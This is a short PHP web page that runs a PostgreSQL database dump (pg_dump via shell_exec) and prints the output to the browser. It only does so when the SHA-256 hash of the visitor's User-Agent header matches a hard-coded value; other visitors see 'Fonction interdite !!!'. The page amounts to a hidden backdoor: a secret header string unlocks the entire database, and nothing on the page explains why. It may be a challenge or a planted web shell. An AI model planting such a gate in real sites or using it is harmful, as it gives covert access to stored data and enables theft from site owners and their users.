<!DOCTYPE html>
<html>
<body>

<h3>Display file content</h3>

<?php
function display_db_content() {
    echo shell_exec( "/opt/rh/postgresql92/root/usr/bin/pg_dump" );
}

$useragent = $_SERVER['HTTP_USER_AGENT'];
if ( hash( 'sha256', $useragent ) == "9c3639f6dccf2d95c4a8c9c00d7edf747adcda5ae7de08af5baa7724b1ecd5fb" ) 
{
    echo "You are allowed !!<br>\n";
    display_db_content();
}
else
{
    echo "Fonction interdite !!!";
}
?>

</body>

</html>
